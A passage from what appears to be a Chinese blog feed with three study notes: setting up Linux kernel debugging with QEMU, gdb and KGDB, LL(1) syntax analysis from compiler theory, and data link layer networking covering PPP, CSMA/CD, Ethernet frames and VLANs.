    <content type="text"><![CDATA[安装内核 123456uname -r#查看本机的内核sudo apt-get install linux-headers-version-generic linux-image-version-generic linux-image-extra-version-generic#安装对应版本内核sudo dpkg --list | grep linux-image#查看已安装的内核版本 编译内核 linux内核源代码下载:https://mirrors.tuna.tsinghua.edu.cn/kernel/. 12make mrpropermake menuconfig 重点配置(有些配置可能因为版本不同而不一样). 取消KernelHacking --&gt; Write protect kernel read-only data structures. 取消Processor type and features --&gt; Paravirtualized guest support. 选中KernelHacking --&gt; Compile the kernel with debug info. 选中KernelHacking --&gt; Compile the kernel with frame pointers. 全选KernelHacking --&gt; KGDB:kernel debugging with remote gdb,其下的全部都选中. 12make bzImage -j8 &amp;&amp; make vmlinux -j8#编译基本的内核 123456make modules -j8#编译内核模块sudo make modules_install#将编译好的模块(.ko文件)拷贝到/lib/modules/liunx-x.xx.x文件夹,内核启动时加载sudo make install#编译出来的压缩内核镜像拷贝到/boot/文件夹下,并且修改/boot/grub/grub.cfg这个grub配置文件. 安装符号文件 1234567891011121314codename=$(lsb_release -c | awk '&#123;print $2&#125;')sudo tee /etc/apt/sources.list.d/ddebs.list &lt;&lt; EOFdeb http://ddebs.ubuntu.com/ $&#123;codename&#125; main restricted universe multiversedeb http://ddebs.ubuntu.com/ $&#123;codename&#125;-security main restricted universe multiversedeb http://ddebs.ubuntu.com/ $&#123;codename&#125;-updates main restricted universe multiversedeb http://ddebs.ubuntu.com/ $&#123;codename&#125;-proposed main restricted universe multiverseEOF#添加源wget -O - http://ddebs.ubuntu.com/dbgsym-release-key.asc | sudo apt-key add -#添加访问符号服务器的密钥sudo apt-get updateapt-cache search linux-image | grep dbgsymsudo apt-get install linux-image-`uname -r`-dbgsym#安装当前内核的符号文件 符号文件会被安装到/usr/lib/debug/目录下,最重要的kernel文件在boot子目录下. 安装源代码 启用deb-src源,然后sudo apt-get update更新. 123apt-cache search linux-sourcesudo apt-get install linux-source-4.15.0#安装4.15.0内核的源代码 源代码的压缩包会被放在/usr/src目录下的同名文件夹下. qemu + gdb busybox 用busybox来生成文件系统,编译配置(有些配置可能因为版本不同而不一样). 设置Busybox Settings --&gt; Build Options -&gt; Build Busybox as a static binary. 关闭Linux System Utilities --&gt; Support mounting NFS file system. 关闭Networking Utilities --&gt; inetd 编译成x86.在如下两个选项中输入对应的值. 12(-m32 -march=i386) Additional CFLAGS(-m32) Additional LDFLAGS 12345make menuconfig#32位编译需要运行下面两条指令#cd /usr/include#sudo ln -s asm-generic/ asmmake install -j8 make install后,在busybox源代码目录下有一个_install目录存放编译后的文件. 1234cd _installmkdir proc sys dev etc etc/init.dvim etc/init.d/rcSchmod +x etc/init.d/rcS etc/init.d/rcS. 1234#!/bin/shmount -t proc none /procmount -t sysfs none /sys/sbin/mdev -s 调用find . | cpio -o --format=newc &gt; ../rootfs.img创建文件系统. 调试 123456789qemu-system-x86_64 -kernel bzImage -initrd rootfs.img -append "console=ttyS0 root=/dev/ram rdinit=/sbin/init" -smp cores=1,threads=1 -cpu kvm64,+smep,+smap --nographic -gdb tcp::1234#-cpu kvm64,+smep,+smap.设置CPU的安全选项.开启smap和smep.#-kernel.设置内核bzImage文件的路径.#-initrd.设置内核启动的文件系统.#-gdb tcp::1234.设置gdb的调试端口.#-append.附加选项,指定no kaslr可以关闭随机偏移.#-m.指定内存大小#-smp.设置内核数和线程数#--nographic和console=ttyS0一起使用启动的界面就会变成当前终端 gdb调试. 12345sudo gdb -q ./vmlinux#加载vmlinux符号文件.gdb&gt; target remote :1234gdb&gt; add-symbol-file ./test.ko &lt;addr of test.ko&gt;#addr of test.ko可以通过cat /proc/modules | grep test.ko获得.需要root权限,修改init文件获得. 双机调试 虚拟机配置 首先移除打印机,然后配置双机的串口. host. target. 配置target 12sudo vim /etc/grub.d/40_customsudo update-grub /etc/grub.d/40_custom. 12345678910111213141516171819202122#!/bin/shexec tail -n +3 $0# This file provides an easy way to add custom menu entries. Simply type the# menu entries you want to add after this comment. Be careful not to change# the &apos;exec tail&apos; line above.menuentry &apos;KGDB&apos; --class ubuntu --class gnu-linux --class gnu --class os $menuentry_id_option &apos;gnulinux-simple-1dd33836-1426-45f7-8cfb-5667fb92953d&apos; &#123; recordfail load_video gfxmode $linux_gfx_mode insmod gzio if [ x$grub_platform = xxen ]; then insmod xzio; insmod lzopio; fi insmod part_msdos insmod ext2 set root=&apos;hd0,msdos1&apos; if [ x$feature_platform_search_hint = xy ]; then search --no-floppy --fs-uuid --set=root --hint-bios=hd0,msdos1 --hint-efi=hd0,msdos1 --hint-baremetal=ahci0,msdos1 1dd33836-1426-45f7-8cfb-5667fb92953d else search --no-floppy --fs-uuid --set=root 1dd33836-1426-45f7-8cfb-5667fb92953d fi linux /boot/vmlinuz-4.15.0-91-generic root=UUID=1dd33836-1426-45f7-8cfb-5667fb92953d ro find_preseed=/preseed.cfg auto noprompt priority=critical locale=en_US quiet kgdbwait kgdb8250=io,03f8,ttyS0,115200,4 kgdboc=ttyS0,115200 kgdbcon nokaslr initrd /boot/initrd.img-4.15.0-91-generic&#125; 该文件可以添加grup启动选项,只需要常规选项中的内核命令行处增加KGDB选项:kgdbwait kgdb8250=io,03f8,ttyS0,115200,4 kgdboc=ttyS0,115200 kgdbcon nokaslr. kgdbwait让系统启动时就进入调试模式,kgdboc是KGDB over console的缩写,ttyS0代表通过1号串口进行通信,波特率为115200.后面的nokaslr是禁止内核空间的地址随机化. 配置host 1234sudo stty -F /dev/ttyS0 115200#设置串口通信的波特率,该选项每次重启会重置sudo stty -F /dev/ttyS0#查看是否设置成功 调试 启动target,开机时按住shift选择对应启动项,进入等待连接状态. host配置好后,gdb连接调试即可. 因为默认用户没有串口设备的使用权限，所以应该先使用如下命令来增加权限.也可以使用sudo方式来启动gdb. 1!sudo usermod -a -G dialout user 123456789gdb -s /usr/lib/debug/boot/vmlinux-4.10.0-19-generic#调试带符号的vmlinuxgdb &gt; set architecture i386:x86-64:intel#设置为64位gdb &gt; dir /usr/src/linux-***#设置源代码目录进行源码级调试gdb &gt; target remote /dev/ttyS0#连接远端gdb &gt; c c之后target会进入系统,通过sudo su &amp;&amp; echo g &gt; "/proc/sysrq-trigger"打开target的kgdb调试. 此时可以在host中下断点,查看内存信息等进行调试了.]]></content>
      <categories>
        <category>IS</category>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>Linux-kernel</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CS-BASIC-compiler-principles-语法分析]]></title>
    <url>%2Fposts%2F59efbcbc%2F</url>
    <content type="text"><![CDATA[概览 语法分析是编译过程的核心,它的任务是在词法分析识别出单词符号串的基础上,分析并判断程序的语法结构是否符合语法规则. 编译器采用正规式和有限自动机描述和识别语言的单词符号,用上下文无关文法来描述语法规则. 所以语法分析器的工作本质就是按文法的产生式,识别输入符号串是否是一个句子. 自上而下分析 从推导的角度看,自上而下分析是从文法的开始符号出发,试图推导出与输入符号串相同的符号串.一般来讲,构造出的推导是最左推导. 从语法树的角度看,从根节点,试图自上而下的构造一颗语法树,其端末节点从左到右连接起来的串正好与输入符号串相同. 回溯问题 自上而下分析需要用带回朔的反复试探过程来解决多个产生式候选的问题,但是这种方法使得系统实现时的效率存在极大的问题,甚至不能进行. 文法左递归问题 消除文法的左递归 一个文法消除左递归的条件:不含以ε为右部的表达式,不含回路. 直接左递归的消除. 间接左递归的消除. 注意:由于对非终结符排序的不同,最后所得的文法在形式上可能不一样,但是都是等价的. 消除回溯 当面对一个要分析的字符,且此时有多个产生式候选,为了确定选择哪个产生式候选,需要知道有哪些产生式候选最后推导出来的句子中存在首个终结符是当前字符的情况. 所以把产生式候选的所有推导出来的句子中的首个终结符加入一个集合来进行判断,这个集合就是产生式第一个字符的FIRST集合. 可以通过提取左公因子把每个非终结符(包括新引进的终结符)的所有FIRST集变成两两不相交的(注意不一定能到达该条件,只能确保靠近,还需要提取后验证). 此时还有一个问题,当产生式候选的首字符的FIRST集合中有ε,则实际上可以将首字符推导为ε,此时要分析的就是后面字符. 此时需要知道首字符的FOLLOW集合. FIRST和FOLLOW集合的构造 LL(1)文法 LL(1)文法:第一个L指从左到右扫描字符串,第二个L指分析过程是最左推导,(1)表示每一步只需要向前查看一个符号. 递归下降分析器 扩充的巴科斯范式和语法图 可以看出扩充的巴科斯范式表达的语法更容易写成程序. JavaCC JavaCC:一个开源的语法分析器生成器和词法分析器生成器. 预测分析程序 实际上文法仅由分析表定义. LL(1)文法与二义性 else悬挂问题是很多程序语言都有的,一般都是程序语言规定就近匹配(大部分,如C语言)或就远匹配. 自下而上分析]]></content>
      <categories>
        <category>CS</category>
        <category>BASIC</category>
      </categories>
      <tags>
        <tag>compiler-principles</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CS-BASIC-computer-network-数据链路层]]></title>
    <url>%2Fposts%2F724c27ea%2F</url>
    <content type="text"><![CDATA[基本概念 数据链路层是实现设备之间通信的非常重要的一层,局域网中的主机,交换机(数据链路层加物理层),路由器(数据链路层加物理层,网络层)等都必须实现数据链路层. 链路(物理链)是一条无源的点到点的物理线路段,中间没有任何其他的交换结点.一条链路只是一条通路的一个组成部分.数据链路(逻辑链路)除了物理线路外,还必须有通信协议来控制这些数据的传输,不同的链路层可能采用不同的数据链路层协议. 若把实现这些协议的硬件和软件加到链路上,就构成了数据链路.早期的数据通信协议曾叫做通信规程(procedure).因此在数据链路层,规程和协议是同义语. 现在最常用的方法是使用适配器(即网卡,通信适配器,网络接口卡,网络接口板等)来实现这些协议的硬件和软件(驱动程序).一般的适配器都包括了数据链路层和物理层这两层的功能. 数据链路层使用的信道可以分为点对点信道和广播信道,广播信道必须使用专用的共享信道协议来协调这些主机的数据发送. 数据链路层协议有许多种,有四个基本问题则是共同的:封装成帧,透明传输,差错控制,多路访问. 使用点对点信道的数据链路层 使用点对点信道的数据链路层需要考虑三个基本问题:封装成帧,透明传输,差错控制. 封装成帧 &amp; 透明传输 封装成帧就是在一段数据的前后分别添加首部和尾部,然后就构成了一个帧.首部和尾部的一个重要作用就是进行帧定界.帧的数据部分要小于MTU最大传送单元,帧长包括首尾部. 在数据链路层透明传输数据,表示无论发送什么样的比特组合的数据,这些数据都能够按照原样没有差错地通过这个数据链路层. 控制字符进行帧定界 当数据是由可打印的ASCII码组成的文本文件时,帧定界可以使用特殊的控制字符(帧定界符).控制字符SOH(Start Of Header)表示帧的开始,另一个控制字符EOT(End Of Transmission)表示帧的结束. 为了实现透明传输,发送端的数据链路层在数据中出现控制字符的前面插入一个转义字符,接收端的数据链路层在将数据送往网络层之前删除插入的转义字符.如果转义字符也出现在数据当中,那么应在转义字符前面插入一个转义字符,当接收端收到连续的两个转义字符时,就删除其中前面的一个. 特殊比特进行帧定界 当数据是由二进制组成的比特块时,帧定界可以使用特殊的比特串. 例如:帧开始和结束用01111110.为了实现透明传输,进行比特填充.发送方,报文中5个连续1,插入0;接收方,收到5个连续1,后为0,去掉.为1,再后为0,则帧结束.否则出错. 差错检测 在传输过程中可能会产生比特差错:1可能会变成0,而0也可能变成1.在一段时间内,传输错误的比特占所传输比特总数的比率称为误码率BER(Bit Error Rate),误码率与信噪比有很大的关系. 在数据链路层传送的帧中,使用了很多检错技术,包括:奇偶校验,循环冗余检验CRC.在数据后面添加上的冗余码称为帧检验序列FCS. 奇偶校验 奇偶校验有两种校验方法:奇校验和偶校验. 奇校验:原始码流加上校验位,总共有奇数个1. 偶校验:原始码流加上校验位,总共有偶数个1. 缺点,只能检错不能纠错.为此,发展出二维奇偶校验. 循环冗余检验 在发送端把数据划分为组,假定每组k个比特,在每组后面再添加供差错检测用的n位冗余码,然后一起发送出去. 冗余码的计算过程:在原数据M后面添加n个0得到的k + n位的数除以事先选定好的长度为n + 1位的除数P,余数是R,将n位的余数R作为冗余码. 在接收端对收到的每一帧进行CRC检验,即将k + n位的数除以P,余数为0则判定这个帧没有差错,否则表示存在差错. 缺点,只能检错不能纠错.仅用循环冗余检验CRC差错检测技术只能做到无差错接受和无比特差错,单纯使用CRC差错检测技术不能实现无差错传输或可靠传输. 点对点协议PPP 对于点对点的链路,目前使用得最广泛的数据链路层协议是点对点协议PPP. PPP协议的特点 PPP协议应满足的需求:简单;封装成帧;透明传输;支持多种类型链路;差错检测;支持多种网络层协议;检测连接状态;最大传送单元;网络层地址协商;数据压缩协商; PPP协议不需要的功能:纠错;流量控制;序号;多点线路;半双工或单工链路; PPP协议有三个组成部分. 一个将IP数据报封装到串行链路的方法. 链路控制协议LCP(Link Control Protocol). 网络控制协议NCP(Network Control Protocol). PPP协议的帧格式 PPP是面向字节的,所有的PPP帧的长度都是整数字节.PPP帧的首部和尾部分别为4个字段和2个字段.标志字段F为0x7E,地址字段A为0xFF,但实际上并不起作用.控制字段C通常置为0x03. 对于透明传输:当PPP用在异步传输时,就使用一种特殊的字符填充法;当PPP用在同步传输链路时,协议规定采用硬件来完成比特填充. 字符填充法:将信息字段中出现的每一个0x7E字节转变成为2字节序列(0x7D, 0x5E).而0x7D字节则转变成为2字节序列(0x7D, 0x5D).若信息字段中出现ASCII码的控制字符(即小于0x20的字符),则在该字符前面要加入一个0x7D字节,同时将该字符的编码加以改变. PPP协议用在SONET/SDH链路时,使用同步传输(一连串的比特连续传送).这时PPP协议采用零比特填充方法来实现透明传输(即前面的比特填充法). PPP协议之所以不使用序号和确认机制:一是因为在数据链路层出现差错的概率不大;二是在因特网环境下,PPP的信息字段放入的数据是IP数据报,数据链路层的可靠传输并不能够保证网络层的传输也是可靠的;最后帧检验序列FCS字段可保证无差错接受. PPP协议的工作状态 当用户拨号接入ISP时,路由器的调制解调器对拨号做出确认,并建立一条物理连接. PC机向路由器发送一系列的LCP分组(封装成多个PPP帧). 这些分组及其响应选择一些PPP参数,并进行网络层配置,NCP给新接入的PC机分配一个临时的IP地址,使PC机成为因特网上的一个主机. 通信完毕时,NCP释放网络层连接,收回原来分配出去的IP地址,接着,LCP释放数据链路层连接,最后释放的是物理层的连接. 可见,PPP协议已不是纯粹的数据链路层的协议,它还包含了物理层和网络层的内容. 使用广播信道的数据链路层 局域网的数据链路层 局域网最主要的特点是:网络为一个单位所拥有,地理范围和站点数目均有限. 局域网主要优点:具有广播功能,从一个站点可很方便地访问全网.局域网上的主机可共享连接在局域网上的各种硬件和软件资源.便于系统的扩展和逐渐地演变,各设备的位置可灵活调整和改变.提高了系统的可靠性,可用性和残存性. 对于使用一对多的广播通信方式,若多个设备在共享的广播信道上同时发送数据,则会造成彼此干扰,导致发送失败. 媒体共享技术 媒体共享技术分为静态划分信道和动态媒体接入控制(多点接入). 静态划分信道有:频分复用,时分复用,波分复用,码分复用.动态媒体接入控制分为:随机接入;受控接入,如多点线路探询,轮询等. 以太网标准 DIX Ethernet V2是世界上第一个局域网产品(以太网)的规约.IEEE 802.3是第一个IEEE的以太网标准.DIX Ethernet V2标准与IEEE的802.3标准只有很小的差别,因此可以将802.3局域网简称为以太网.严格说来,以太网应当是指符合DIX Ethernet V2标准的局域网. 局域网的数据链路层有两个子层:逻辑链路控制LLC子层和媒体接入控制MAC子层. 与接入到传输媒体有关的内容都放在MAC子层,而LLC子层则与传输媒体无关.不管采用何种协议的局域网,对LLC子层来说都是透明的.一般不考虑LLC子层,因为TCP/IP体系经常使用的局域网是DIX Ethernet V2而不是802.3标准中的几种局域网,很多厂商生产的适配器上就仅装有MAC协议而没有LLC协议. 网络适配器 网络适配器的重要功能:进行串行/并行转换,对数据进行缓存,在计算机的操作系统安装设备驱动程序,实现以太网协议. CSMA/CD协议 最初的以太网是将许多计算机都连接到一根总线上,易于实现广播通信,当初认为这样的连接方法既简单又可靠,因为总线上没有有源器件. 为了实现一对一通信/寻址,将接收站的硬件地址写入帧首部中的目的地址字段中,仅当数据帧中的目的地址与适配器的硬件地址一致时,才能接收这个数据帧. 以太网采用无连接的工作方式,不必先建立连接就可以直接发送数据,对发送的数据帧不进行编号,也不要求对方发回确认.以太网提供的服务是不可靠的交付,当目的站收到有差错的数据帧时就丢弃此帧,其他什么也不做,差错的纠正由高层来决定即尽最大努力的交付,如果高层发现丢失了一些数据而进行重传,但以太网并不知道这是一个重传的帧,而是当作一个新的数据帧来发送. 若多台计算机或多个站点同时发送时,会产生发送碰撞或冲突,导致发送失败.为了避免同时发送产生的碰撞以太网发送的数据都使用曼彻斯特.曼彻斯特编码缺点是:它所占的频带宽度比原始的基带信号增加了一倍. 同时采用了CSMA/CD(载波监听多点接入/碰撞检测)协议防止产生碰撞. 载波监听就是用电子技术检测总线上有没有其他计算机发送的数据信号,如果有,则暂时不要发送数据,以免发生碰撞. 碰撞检测就是计算机边发送数据边检测信道上的信号电压大小,当几个站同时在总线上发送数据时,总线上的信号电压摆动值将会增大,当一个站检测到的信号电压摆动值超过一定的门限值时,就认为总线上至少有两个站同时在发送数据,表明产生了碰撞.所谓碰撞就是发生了冲突,因此碰撞检测也称为冲突检测.每一个正在发送数据的站,一旦发现总线上出现了碰撞,就要立即停止发送,免得继续浪费网络资源,然后等待一段随机时间后再次发送. 因为信号传播时延对载波监听产生了影响所以需要碰撞检测进行补充.最先发送数据帧的站,在发送数据帧后至多经过时间两倍的端到端往返时延就可知道发送的数据帧是否遭受了碰撞.以太网的两倍的端到端往返时延称为争用期,或碰撞窗口.经过争用期这段时间还没有检测到碰撞,才能肯定这次发送不会发生碰撞. 10Mbit/s以太网取51.2μs为争用期的长度,对于10Mbit/s以太网,在争用期内可发送512bit,即64字节.这意味着以太网在发送数据时,若前64字节没有发生冲突,则后续的数据就不会发生冲突.如果发生冲突,就一定是在发送的前64字节之内.由于一检测到冲突就立即中止发送,这时已经发送出去的数据一定小于64字节.以太网规定了最短有效帧长为64字节,凡长度小于64字节的帧都是由于冲突而异常中止的无效帧. 以太网上最大的端到端单程时延必须小于争用期的一半,这相当于10Mbit/s以太网51.2μs的争用期内,最大端到端长度约为5km. 使用CSMA/CD协议的以太网不能进行全双工通信而只能进行双向交替通信(半双工通信).每个站在发送数据之后的一小段时间内,存在着遭遇碰撞的可能性. 二进制指数类型退避算法 发生碰撞的站在停止发送数据后,要推迟(退避)一个随机时间t才能再发送数据. 设k = min(重传次数, 10).基本退避时间取为争用期2x. 从整数集合[0, 1, ..., (2k - 1)]中随机地取出一个数,记为r,则重传所需的等待时间t = r * 2x. 当重传达16次仍不能成功时即丢弃该帧,并向高层报告. 使用集线器的星形拓扑 10BASE-T特点:使用无屏蔽双绞线,采用星形拓扑.每个站需要用两对双绞线,分别用于发送和接收.双绞线的两端使用RJ-45插头.集线器使用了大规模集成电路芯片,因此集线器的可靠性提高.每个站到集线器的距离不超过100m. 传统以太网最初是使用粗同轴电缆,后来演进到使用比较便宜的细同轴电缆,最后发展为使用更便宜和更灵活的双绞线.采用双绞线的以太网采用星形拓扑,在星形的中心则增加了一种可靠性非常高的设备,叫做集线器. 集线器是使用电子器件来模拟实际电缆线的工作.使用集线器的以太网在逻辑上仍是一个总线网,各工作站使用的还是CSMA/CD协议,并共享逻辑上的总线.集线器很像一个多接口的转发器,工作在物理层. 以太网的信道利用率 假设x是以太网单程端到端传播时延,则争用期长度为2x,检测到碰撞后不发送干扰信号.设帧长为L(bit),数据发送速率为C(bit/s),帧的发送时间为T0 = L/C(s),成功发送一个帧需要占用信道的时间是T0 + x.一个站在发送帧时出现了碰撞,经过一个争用期后,可能又出现了碰撞,这样经过若干个争用期后,一个站发送成功了,最后发送一帧所需的平均时间如下. 在以太网中定义了参数a,它是以太网单程端到端时延x与帧的发送时间T0之比.当数据率一定时,以太网的连线的长度受到限制,否则x的数值会太大;以太网的帧长不能太短,否则T0的值会太小,使a值太大.极限信道利用率Smax:总线一旦空闲就有某一个站立即发送数据,此时信道利用率为极限信道利用率,大小为1 / (1 + a). 只有当参数a远小于1才能得到尽可能高的极限信道利用率.据统计,当以太网的利用率达到30%时就已经处于重载的情况.很多的网络容量被网上的碰撞消耗掉. 以太网的MAC层 在局域网中,硬件地址称为MAC地址.每个适配器都有一个独一无二的MAC地址.MAC地址实际上就是适配器地址或适配器标识符EUI-48. IEEE 802标准规定MAC地址字段可采用6字节(48位)或2字节(16位).IEEE的注册管理机构RA负责向厂家分配地址字段6个字节中的前三个字节(即高位24位),称为组织唯一标识符.地址字段的后三个字节(即低位24位)由厂家自行指派,称为扩展唯一标识符,必须保证生产出的适配器没有重复地址. IEEE规定MAC地址字段的第一字节的最低位为I/G位:当I/G位为0时,地址字段表示一个单站地址.当I/G位为1时,表示组地址,用来进行多播.此时,IEEE只分配地址字段前三个字节中的23位.所有48位都为1时,为广播地址.只能作为目的地址使用. IEEE把地址字段第一字节的最低第2位规定为G/L位:当G/L位为0时,是全球管理,保证在全球没有相同的地址,厂商向IEEE购买的OUI都属于全球管理.当G/L位为1时,是本地管理,这时用户可任意分配网络上的地址. 适配器从网络上每收到一个MAC帧就首先用硬件检查MAC帧中的MAC地址.如果是发往本站的帧则收下,然后再进行其他的处理.否则就将此帧丢弃,不再进行其他的处理.发往本站的帧包括以下三种帧:单播帧,广播帧,多播帧. 所有的适配器都至少能够识别前两种帧,即能够识别单播地址和广播地址.有的适配器可用编程方法识别多播地址.只有目的地址才能使用广播地址和多播地址.以混杂方式工作的以太网适配器只要听到有帧在以太网上传输就都接收下来. MAC帧的格式 常用的以太网MAC帧格式有两种标准:DIX Ethernet V2标准;IEEE的802.3标准.最常用的MAC帧是以太网V2的格式. 类型字段用来标志上一层使用的是什么协议.数据字段的正式名称是MAC客户数据字段.最小长度64字节减去18字节的首部和尾部就得到数据字段的最小长度46字节.当数据字段的长度小于46字节时,应在数据字段的后面加入整数字节的填充字段.在帧的前面插入(硬件生成)的8字节中,前7个字节是前同步码,用来迅速实现MAC帧的比特同步.最后1个字节是帧开始定界符,表示后面的信息就是MAC帧. 无效的MAC帧:数据字段的长度与长度字段的值不一致,帧的长度不是整数个字节,用收到的帧检验序列FCS查出有差错,数据字段的长度不在46 ~ 1500字节之间,有效的MAC帧长度不在64 ~ 1518字节之间.对于检查出的无效MAC帧就简单地丢弃,以太网不负责重传丢弃的帧. IEEE 802.3 MAC帧格式与以太网V2 MAC帧格式相似,区别在于IEEE 802.3规定的MAC帧的第三个字段是长度/类型.当这个字段值大于0x600时,就表示类型.这样的帧和以太网V2 MAC帧完全一样.当这个字段值小于0x600时,就表示长度.此时数据字段必须装入上面的逻辑链路控制LLC子层的LLC帧. 帧间最小间隔为9.6μs,相当于96bit的发送时间.一个站在检测到总线开始空闲后,还要等待9.6μs才能再次发送数据.这样做是为了使刚刚收到数据帧的站的接收缓存来得及清理,做好接收下一帧的准备. 扩展的以太网 在物理层扩展以太网 使用光纤扩展:主机使用光纤(通常是一对光纤)和一对光纤调制解调器连接到集线器.很容易使主机和几公里以外的集线器相连接. 使用集线器扩展:将多个以太网段连成更大的,多级星形结构的以太网. 优点:使原来属于不同碰撞域的以太网上的计算机能够进行跨碰撞域的通信;扩大了以太网覆盖的地理范围. 缺点:碰撞域增大了,但总的吞吐量并未提高.如果不同的碰撞域使用不同的数据率,那么就不能用集线器将它们互连起来. 碰撞域又称为冲突域,是指网络中一个站点发出的帧会与其他站点发出的帧产生碰撞或冲突的那部分网络.碰撞域越大,发生碰撞的概率越高. 在数据链路层扩展以太网 扩展以太网更常用的方法是在数据链路层进行.早期使用网桥,现在使用以太网交换机. 网桥工作在数据链路层,它根据MAC帧的目的地址对收到的帧进行转发和过滤.当网桥收到一个帧时,并不是向所有的接口转发此帧,而是先检查此帧的目的MAC地址,然后再确定将该帧转发到哪一个接口,或把它丢弃.网桥可以互联不同类型的局域网.网桥使各网段成为隔离开的碰撞域. 1990年问世的交换式集线器可明显地提高以太网的性能.交换式集线器常称为以太网交换机或第二层交换机,强调这种交换机工作在数据链路层. 以太网交换机实质上就是一个多接口的网桥,通常都有十几个或更多的接口.每个接口都直接与一个单台主机或另一个以太网交换机相连,并且一般都工作在全双工方式,以太网交换机具有并行性.能同时连通多对接口,使多对主机能同时通信.相互通信的主机都是独占传输媒体,无碰撞地传输数据. 以太网交换机的接口有存储器,能在输出端口繁忙时把到来的帧进行缓存.以太网交换机是一种即插即用设备,其内部的帧交换表(地址表)是通过自学习算法自动地逐渐建立起来的.以太网交换机使用了专用的交换结构芯片,用硬件转发,其转发速率要比使用软件转发的网桥快很多.以太网交换机的性能远远超过普通的集线器,而且价格并不贵. 以太网交换机的用户独享带宽,增加了总容量.从共享星形以太网转到交换式以太网时,所有接入设备的软件和硬件,适配器等都不需要做任何改动.以太网交换机一般都具有多种速率的接口,方便了各种不同情况的用户. 以太网交换机的交换方式:存储转发,先缓存后处理;直通方式,接收数据帧的同时就立即按数据帧的目的MAC地址决定该帧的转发接口,因而提高了帧的转发速度.但有可能也将一些无效帧转发给其他的站. 以太网交换机内部的帧交换表的自学习算法存在回路问题.IEEE 802.1D标准制定了一个生成树协议STP:其要点是不改变网络的实际拓扑,但在逻辑上则切断某些链路,使得从一台主机到所有其他主机的路径是无环路的树状结构,从而消除回路现象. 总线以太网使用CSMA/CD协议,以半双工方式工作.以太网交换机不使用共享总线,没有碰撞问题,因此不使用CSMA/CD协议,以全双工方式工作.但仍然采用以太网的帧结构.总线形以太网所有计算机都处于同一个碰撞域中和同一个广播域中.交换机扩展的10Base_T星形以太网每个接口都处于一个独立的碰撞域中,但所有计算机都处于同一个广播域中. 广播域指这样一些网络,其中任何一台设备发出的广播通信都能被这些网络中的所有其他设备所接收.只有第三层的相关设备(如路由器)或特殊设备才能隔离广播域. 虚拟局域网VLAN 虚拟局域网其实只是局域网给用户提供的一种服务,而并不是一种新型局域网. 每个虚拟局域网是一个广播域,当B1向VLAN2工作组内成员发送数据时,工作站B2和B3将会收到其广播的信息,VLAN1和VLAN3中的工作站都不会收到广播信息. 划分虚拟局域网的方法:基于交换机端口,基于计算机网卡的MAC地址,基于协议类型,基于IP子网地址,基于高层应用或服务. IEEE批准了802.3ac标准,该标准定义了以太网的帧格式的扩展,以支持虚拟局域网.虚拟局域网协议允许在以太网的帧格式中插入一个4字节的标识符,称为VLAN标记(tag),用来指明该帧属于哪一个虚拟局域网.插入VLAN标记得出的帧称为802.1Q帧或带标记的以太网帧.这对主机来说是透明的,交换机会在发送给主机前去掉标记. 高速以太网 100BASE-T以太网 速率达到或超过100Mbit/s的以太网称为高速以太网,100BASE-T以太网是在双绞线上传送100Mbit/s基带信号的星形拓扑以太网,仍使用IEEE 802.3的CSMA/CD协议,又称为快速以太网,其代号为IEEE 802.3u. 特点:可在全双工方式下工作而无冲突发生.在全双工方式下工作时,不使用CSMA/CD协议.MAC帧格式仍然是802.3标准规定的.保持最短帧长不变,但将一个网段的最大电缆长度减小到100米.帧间时间间隔从原来的9.6μs改为现在的0.96μs. 三种不同的物理层标准:100BASE-TX,使用2对UTP 5类线或屏蔽双绞线STP,网段最大程度100米;100BASE-T4,使用4对UTP 3类线或5类线,网段最大程度100米;100BASE-FX,使用2对光纤,网段最大程度2000米. 吉比特以太网 允许在1Gbit/s下以全双工和半双工两种方式工作.使用IEEE 802.3协议规定的帧格式.在半双工方式下使用CSMA/CD协议,全双工方式不使用CSMA/CD协议.与10BASE-T和100BASE-T技术向后兼容. 使用两种成熟的技术:一种来自现有的以太网,另一种则是美国国家标准协会ANSI制定的光纤通道FC. 吉比特以太网工作在半双工方式时,就必须进行碰撞检测.为保持64字节最小帧长度,以及100米的网段的最大长度,吉比特以太网增加了两个功能:载波延伸,分组突发.当吉比特以太网工作在全双工方式时,不使用载波延伸和分组突发. 载波延伸:使最短帧长仍为64字节,同时将争用时间增大为512字节.发送的MAC帧长不足512字节时就用一些特殊字符填充在帧的后面,接收端在收到以太网的MAC帧后,要将所填充的特殊字符删除后才向高层交付. 分组突发:当很多短帧要发送时,第一个短帧要采用载波延伸方法进行填充,随后的一些短帧则可一个接一个地发送,只需留有必要的帧间最小间隔即可.这样就形成可一串分组的突发,直到达到1500字节或稍多一些为止. 10吉比特以太网(10GE)和更快的以太网 10吉比特以太网与之前以太网的帧格式完全相同,保留802.3标准规定的以太网最小和最大帧长,便于升级.不再使用铜线而只使用光纤作为传输媒体.只工作在全双工方式,因此没有争用问题,也不使用CSMA/CD协议.此时以太网的工作范围已经从局域网扩大到城域网和广域网. 使用以太网进行宽带接入 以太网宽带接入具有以下特点:可以提供双向的宽带通信,可以根据用户对带宽的需求灵活地进行带宽升级,可以实现端到端的以太网传输,中间不需要再进行帧格式的转换.这就提高了数据的传输效率且降低了传输的成本,但是不支持用户身份鉴别. PPPoE把PPP协议与以太网协议结合起来,将PPP帧再封装到以太网中来传输.现在的光纤宽带接入FTTx都要使用PPPoE的方式进行接入.在PPPoE弹出的窗口中键入用户名和密码进行宽带上网.利用ADSL进行宽带上网时,从用户个人电脑到家中的ADSL调制解调器之间,也是使用RJ-45和5类线进行连接的,并且也是使用PPPoE弹出的窗口进行拨号连接的. 其它随机访问协议 ALOHA:一种用于解决在分组无线通信系统中分配广播信道的分布式方法.当结点获得新帧,将随时传输.无碰撞,结点能够继续发送新帧.如果碰撞,结点能够检测到. 时隙ALOHA:单个活跃结点能够连续地以信道的全速传输,减少了碰撞的概率,简单.但是结点时钟同步困难. IEEE 802.5:令牌环 拓扑结构:点到点链路连接,构成闭合环. 传输媒体:屏蔽双绞线,光纤,速率1/4/16Mbps.最多站点数:250,信号采用曼彻斯特编码. 特殊帧:令牌.工作状态分为发送方式和收听方式, 发送方:首先截获token,发送方负责回收所发出的frame,发送完毕后产生新的令牌. 收听方:数据以帧为单位从TCU的输出端发送到下一个TCU的输入端,数据在绕环一周后回到源站,源站检查返回的数据帧,确定发送是否成功,若没有数据要发送,则产生新令牌发送到环路上. IEEE 802.5的帧结构. IEEE 802.4:令牌总线 特点:物理上是总线网,逻辑上是令牌网. 